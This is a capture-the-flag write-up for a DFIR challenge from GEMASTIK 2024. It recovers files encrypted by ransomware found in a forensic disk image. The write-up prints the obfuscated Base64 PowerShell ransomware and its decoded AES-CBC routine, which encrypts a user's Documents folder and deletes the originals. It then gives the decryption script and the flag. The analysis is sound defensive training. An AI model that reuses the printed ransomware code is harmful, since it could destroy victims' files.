---
description: >-
  GEMASTIK, or the National Student Performance in Information and Communication Technology, is a program organized by the Indonesian Talent Development Center, under the National Achievement Center, Ministry of Education, Culture, Research, and Technology.
---

# GEMASTIK CTF 2024

## Forensics

### Ruze

> You are a DFIR Consultant, you got a client (MR. K) who has a ransomware problem, where when he installs something suddenly his device reboots and his files suddenly disappear, and there are files that confirm that he was hit by ransomware. can you help him?
>
> Note : Dont execute the malicious file on your computer!
>
> Note : Remember you are a DFIR Consultant, not a malware consultant who focus to analyze the ransomware file!
>
> you can download the file you need in here : https://mega.nz/file/Ln53ARjT#ZUwOX1WBfTsRjgjsYgsHB5xr6d4pGNpVPr8N3kl6WhI
>
> Password : 1nip4ssw0rdny4


#### Solution:

Given `forensic_ruze.ad1` file. An `.AD1` file is an AccessData Forensic Toolkit Device Dump file. I opened and analyzed the file with [FTK Imager](https://www.exterro.com/digital-forensics-software/ftk-imager). 

I found an interesting file at, `forensic_ruze.ad1\\\.\PHYSICALDRIVE0\Partition 1 [51198MB]\NONAME [NTFS]\[root]\Users[AD1]\sand-4ECC834FCF\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Console.bat`. 

![Powershell History in Console.bat](../../.gitbook/assets/image%20(14).png)

```shell
JABLAHMAagBpAEIARAAgAD0AIAAiAGAAIgBzAGUAbgBvAGQAYAAiACAAdAB1AHAAdAB1AE8ALQBlAHQAaQByAFcAOwB9ADgAMgBFAEUAMgA5ACQAIAA5AEEANgA2ADcANgAkACAAMQBFADgAMwBDAEUAJAAgADAAQwAzADgANwBEACQAIABlAGwAaQBGAC0AdABwAHkAcgBjAG4ARQA7AGUAbQBhAE4ALgBDAEUANQBCADkAQwAkACAAaAB0AGEAUABkAGwAaQBoAEMALQAgADAAOQA2ADkANgAwACQAIABoAHQAYQBQAC0AIABoAHQAYQBQAC0AbgBpAG8ASgAgAD0AIAAxAEUAOAAzAEMARQAkADsAZQBtAGEATgBsAGwAdQBGAC4AQwBFADUAQgA5AEMAJAAgAD0AIAAwAEMAMwA4ADcARABgACQAewAgACkANQAzADQAOABGADEAJAAgAG4AaQAgAEMARQA1AEIAOQBDAGAAJAAoACAAaABjAGEAZQByAG8AZgA7AGUAbABpAEYALQAgAEEAQwA5AEMAOQBGACQAIABoAHQAYQBQAC0AIABtAGUAdABJAGQAbABpAGgAQwAtAHQAZQBHACAAPQAgADUAMwA0ADgARgAxACQAOwB9ADAANgBFADkANgAwACQAIABoAHQAYQBQAC0AIAB5AHIAbwB0AGMAZQByAGkARAAgAGUAcAB5AFQAbQBlAHQASQAtACAAbQBlAHQASQAtAHcAZQBOAHsAIAApACkAMAA2AEUAOQA2ADAAJAAgAGgAdABhAFAALQAgAGgAdABhAFAALQB0AHMAZQBUACgAIAB0AG8AbgAtACgAIABmAGkAOwA5AEEANgA2ADcANgAkACAAdAB1AHAAdAB1AE8ALQBlAHQAaQByAFcAOwBgACIAMQAyADMAZgAzADQAOAAyAGEANgA3ADAAYAAiAC4AKQBgACIAMQAyADMAZgAzADQAOAAyAGEANgA3ADAAYAAiACAAZQBtAGEATgAtACAAMAA2AEUAOQA2ADAAJAAgAGgAdABhAFAALQAgAHkAdAByAGUAcABvAHIAUABtAGUAdABJAC0AdABlAEcAKAAgAD0AIAA4ADIARQBFADIAOQAkADsAYAAiADYAMABiADEAZQBlAGUAYgAyAGUAOQA1AGAAIgAuACkAYAAiADYAMABiADEAZQBlAGUAYgAyAGUAOQA1AGAAIgAgAGUAbQBhAE4ALQAgADAANgBFADkANgAwACQAIABoAHQAYQBQAC0AIAB5AHQAcgBlAHAAbwByAFAAbQBlAHQASQAtAHQAZQBHACgAIAA9ACAAOQBBADYANgA3ADYAJAA7AGAAIgA3ADcAYgBiAGYAYQA5AGEANwBlADIAMABcAG4AbwBpAHMAcgBlAFYAdABuAGUAcgByAHUAQwBcAFQATgAgAHMAdwBvAGQAbgBpAFcAXAB0AGYAbwBzAG8AcgBjAGkATQBcAGUAcgBhAHcAdABmAG8AUwBcADoAVQBDAEsASABgACIAIAA9ACAAMAA2AEUAOQA2ADAAJAA7AH0AYAAiACEAdABzAGkAeABFACAAeQBkAGEAZQByAGwAQQBgACIAewAgAF0AbgBvAGkAdABwAGUAYwB4AEUATwBJAC4ATwBJAC4AbQBlAHQAcwB5AFMAWwAgAGgAYwB0AGEAYwAgAH0AcABvAHQAUwAgAG4AbwBpAHQAYwBBAHIAbwByAHIARQAtACAAeQByAG8AdABjAGUAcgBpAEQAIABlAHAAeQBUAG0AZQB0AEkALQAgADAAOQA2ADkANgAwACQAIABoAHQAYQBQAC0AIABtAGUAdABJAC0AdwBlAE4AewAgAHkAcgB0ADsAYAAiAGUAZwBhAHIAYQBHAFwAdABmAG8AcwBvAHIAYwBpAE0AXABsAGEAYwBvAEwAXABhAHQAYQBEAHAAcABBAFwAYAAiACAAKwAgAGUAbQBhAE4AcgBlAHMAVQA6AHYAbgBFACQAIAArACAAYAAiAFwAcwByAGUAcwBVAFwAOgBDAGAAIgAgAD0AIAAwADkANgA5ADYAMAAkADsARgBEAEQARgA4ADEAJAAgAD0AIABBAEMAOQBDADkARgAkADsAYAAiAHMAdABuAGUAbQB1AGMAbwBEAFwAYAAiACAAKwAgAGUAbQBhAE4AcgBlAHMAVQA6AHYAbgBFACQAIAArACAAYAAiAFwAcwByAGUAcwBVAFwAOgBDAGAAIgAgAD0AIABGAEQARABGADgAMQAkADsAfQAwAEMAMwA4ADcARAAkACAAaAB0AGEAUAAtACAAbQBlAHQASQAtAGUAdgBvAG0AZQBSADsAYAAiAGUAbgBvAGQAYAAiACAAdAB1AHAAdAB1AE8ALQBlAHQAaQByAFcAOwApADQANABGADEAOABDACQAIAAsADEARQA4ADMAQwBFAGAAJAAoAHMAZQB0AHkAQgBsAGwAQQBlAHQAaQByAFcAOgA6AF0AZQBsAGkARgAuAE8ASQAuAG0AZQB0AHMAeQBTAFsAIAA9ACAAMgA2ADcAMwBGADgAJAA7ADEARQA4ADMAQwBFACQAIAB0AHUAcAB0AHUATwAtAGUAdABpAHIAVwA7ACkAKABlAHMAbwBwAHMAaQBEAC4AQgAyAEIARAA4ADgAJAA7ADAARgAwAEIAMgA0ACQAIAArACAAVgBJAC4AQgAyAEIARAA4ADgAJAAgAD0AIAA0ADQARgAxADgAQwAkACAAXQBdAFsAZQB0AHkAYgBbADsAOwApAGgAdABnAG4AZQBMAC4AOAA1AEUAQQBEAEIAJAAgACwAMAAgACwAOAA1AEUAQQBEAEIAYAAkACgAawBjAG8AbABCAGwAYQBuAGkARgBtAHIAbwBmAHMAbgBhAHIAVAAuADgARgA1ADgARgBGACQAIAA9ACAAMABGADAAQgAyADQAJAA7ACkAKAByAG8AdABwAHkAcgBjAG4ARQBlAHQAYQBlAHIAQwAuAEIAMgBCAEQAOAA4ACQAIAA9ACAAOABGADUAOABGAEYAJAA7ACkAMABDADMAOAA3AEQAYAAkACgAcwBlAHQAeQBCAGwAbABBAGQAYQBlAFIAOgA6AF0AZQBsAGkARgAuAE8ASQAuAG0AZQB0AHMAeQBTAFsAIAA9ACAAOAA1AEUAQQBEAEIAJAA7ADcAUwBDAEsAUAA6ADoAXQBlAGQAbwBNAGcAbgBpAGQAZABhAFAALgB5AGgAcABhAHIAZwBvAHQAcAB5AHIAQwAuAHkAdABpAHIAdQBjAGUAUwAuAG0AZQB0AHMAeQBTAFsAIAA9ACAAZwBuAGkAZABkAGEAUAAuAEIAMgBCAEQAOAA4ACQAOwBDAEIAQwA6ADoAXQBlAGQAbwBNAHIAZQBoAHAAaQBDAC4AeQBoAHAAYQByAGcAbwB0AHAAeQByAEMALgB5AHQAaQByAHUAYwBlAFMALgBtAGUAdABzAHkAUwBbACAAPQAgAGUAZABvAE0ALgBCADIAQgBEADgAOAAkADsAQQAzADYAMgA4ADYAJAAgAD0AIABWAEkALgBCADIAQgBEADgAOAAkADsAMQBEADkAOQAwADQAJAAgAD0AIAB5AGUASwAuAEIAMgBCAEQAOAA4ACQAOwBgACIAZABlAGcAYQBuAGEATQBzAGUAQQAuAHkAaABwAGEAcgBnAG8AdABwAHkAcgBDAC4AeQB0AGkAcgB1AGMAZQBTAC4AbQBlAHQAcwB5AFMAYAAiACAAdABjAGUAagBiAE8ALQB3AGUATgAgAD0AIABCADIAQgBEADgAOAAkADsAfQBgACIAUgBPAFIAUgBFAGAAIgAgAHcAbwByAGgAdAB7ACAAKQA2ADEAIABlAG4ALQAgAGgAdABnAG4AZQBMAC4AQQAzADYAMgA4ADYAYAAkACgAIABmAGkAOwB9AGAAIgBSAE8AUgBSAEUAYAAiACAAdwBvAHIAaAB0AHsAIAApADIAMwAgAGUAbgAtACAAaAB0AGcAbgBlAEwALgAxAEQAOQA5ADAANAAkACAAZABuAGEALQAgADQAMgAgAGUAbgAtACAAaAB0AGcAbgBlAEwALgAxAEQAOQA5ADAANAAkACAAZABuAGEALQAgADYAMQAgAGUAbgAtACAAaAB0AGcAbgBlAEwALgAxAEQAOQA5ADAANABgACQAKAAgAGYAaQA7ACkAOAAyAEUARQAyADkAYAAkACgAcwBlAHQAeQBCAHQAZQBHAC4AOABGAFQAVQA6ADoAXQBnAG4AaQBkAG8AYwBuAEUALgB0AHgAZQBUAC4AbQBlAHQAcwB5AFMAWwAgAD0AIABBADMANgAyADgANgAkADsAKQA5AEEANgA2ADcANgBgACQAKABzAGUAdAB5AEIAdABlAEcALgA4AEYAVABVADoAOgBdAGcAbgBpAGQAbwBjAG4ARQAuAHQAeABlAFQALgBtAGUAdABzAHkAUwBbACAAPQAgADEARAA5ADkAMAA0ACQAOwApADgAMgBFAEUAMgA5ACQAXQBnAG4AaQByAHQAcwBbACwAOQBBADYANgA3ADYAJABdAGcAbgBpAHIAdABzAFsALAAxAEUAOAAzAEMARQAkAF0AZwBuAGkAcgB0AHMAWwAsADAAQwAzADgANwBEACQAXQBnAG4AaQByAHQAcwBbACgAIABtAGEAcgBhAHAAewAgAGUAbABpAEYALQB0AHAAeQByAGMAbgBFACAAbgBvAGkAdABjAG4AdQBmACIAOwAgACQAWABTAGoAZABzAEYAVgAgAD0AIAAkAEsAcwBqAGkAQgBEAFsALQAxACAALgAuACAALQAkAEsAcwBqAGkAQgBEAC4ATABlAG4AZwB0AGgAXQA7ACAAJABBAEMAYgB4AFMARABpACAAPQAgACgALQBqAG8AaQBuACAAJABYAFMAagBkAHMARgBWACkAOwAgAGkAZQB4ACAAJABBAEMAYgB4AFMARABpAAoA
```

Decoding it from Base64, removing null bytes, and reversing the string results in

```shell
iDSxbCA$ xei ;)VFsdjSX$ nioj-( = iDSxbCA$ ;]htgneL.DBijsK$- .. 1-[DBijsK$ = VFsdjSX$ ;"function Encrypt-File {param ([string]$D783C0,[string]$EC38E1,[string]$6766A9,[string]$92EE28);$4099D1 = [System.Text.Encoding]::UTF8.GetBytes($`6766A9);$68263A = [System.Text.Encoding]::UTF8.GetBytes($`92EE28);if ($`4099D1.Length -ne 16 -and $4099D1.Length -ne 24 -and $4099D1.Length -ne 32) {throw "`ERROR"`};if ($`68263A.Length -ne 16) {throw "`ERROR"`};$88DB2B = New-Object "`System.Security.Cryptography.AesManaged"`;$88DB2B.Key = $4099D1;$88DB2B.IV = $68263A;$88DB2B.Mode = [System.Security.Cryptography.CipherMode]::CBC;$88DB2B.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;$BDAE58 = [System.IO.File]::ReadAllBytes($`D783C0);$FF85F8 = $88DB2B.CreateEncryptor();$42B0F0 = $FF85F8.TransformFinalBlock($`BDAE58, 0, $BDAE58.Length);;[byte[]] $C81F44 = $88DB2B.IV + $42B0F0;$88DB2B.Dispose();Write-Output $EC38E1;$8F3762 = [System.IO.File]::WriteAllBytes($`EC38E1, $C81F44);Write-Output "`done"`;Remove-Item -Path $D783C0};$18FDDF = "`C:\Users\"` + $Env:UserName + "`\Documents"`;$F9C9CA = $18FDDF;$069690 = "`C:\Users\"` + $Env:UserName + "`\AppData\Local\Microsoft\Garage"`;try {New-Item -Path $069690 -ItemType Directory -ErrorAction Stop} catch [System.IO.IOException] {"`Already Exist!"`};$069E60 = "`HKCU:\Software\Microsoft\Windows NT\CurrentVersion\02e7a9afbb77"`;$6766A9 = (Get-ItemProperty -Path $069E60 -Name "`59e2beee1b06"`)."`59e2beee1b06"`;$92EE28 = (Get-ItemProperty -Path $069E60 -Name "`076a2843f321"`)."`076a2843f321"`;Write-Output $6766A9;if (-not (Test-Path -Path $069E60)) {New-Item -ItemType Directory -Path $069E60};$1F8435 = Get-ChildItem -Path $F9C9CA -File;foreach ($`C9B5EC in $1F8435) {$`D783C0 = $C9B5EC.FullName;$EC38E1 = Join-Path -Path $069690 -ChildPath $C9B5EC.Name;Encrypt-File $D783C0 $EC38E1 $6766A9 $92EE28};Write-Output "`dones"`" = DBijsK$
```

That's not perfectly decoded, but I can infer what this script does:

1. Encrypts the file with AES CBC.
2. AES Key and IV are taken from `HKCU:\Software\Microsoft\Windows NT\CurrentVersion\02e7a9afbb77`.
3. Checks if the Key length is in (16, 24, 32) bytes and IV length is 16 bytes.
4. Encrypts all file in `C:\Users\<Username>\Documents`.
5. Prepends IV to encrypted data.
6. Stores the encrypted file in `C:\Users\<Username>\AppData\Local\Microsoft\Garage`.
7. Deletes original file.

![Garage Directory](../../.gitbook/assets/image%20(15).png)

As mention above, IV is prepended to encrypted file.

![AES IV](../../.gitbook/assets/image%20(16).png)

So, we know that the IV is `15ccfc351be2d69c`.

Next, we need to find the Key that is store in Windows Registry.

I got stuck because I didn't know where the registry was located in this logical dump file.

While reading about the registry from Microsoft's [site](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/windows-registry-advanced-users), I found an interesting part mentioning that sometimes the registry is stored on `.dat` file.

![About Registry](../../.gitbook/assets/image%20(17).png)


So, I extracted the NTUSER.dat from `forensic_ruze.ad1\\\.\PHYSICALDRIVE0\Partition 1 [51198MB]\NONAME [NTFS]\[root]\Users[AD1]\sand-4ECC834FCF\NTUSER.DAT`. 

![NTUSER.dat Location](../../.gitbook/assets/image%20(18).png)

Now, I explored the file with [registry viewer](https://www.exterro.com/ftk-product-downloads/registry-viewer-2-0-0). 

![Registry Value](../../.gitbook/assets/image%20(19).png)

Based on the image above, we know that:

IV = "15ccfc351be2d69c"

KEY = "ea0aaa5d53dddfe1".

The decryption process uses this script,

```python
from Crypto.Cipher import AES


with open("seccreettttt_credentialll_confidentalll_moodd_booossteerrrr.pdf", "rb") as f:
    enc_data = f.read()[16:]


IV = b"15ccfc351be2d69c"
KEY = b"ea0aaa5d53dddfe1"


aes = AES.new(KEY, AES.MODE_CBC, IV)


dec = aes.decrypt(enc_data)


with open("flag.pdf", "wb") as f:
    f.write(dec)
```


![gemastik{be_careful_with_what_is_on_the_internet_r4nsom_everywhere}](../../.gitbook/assets/image%20(20).png)
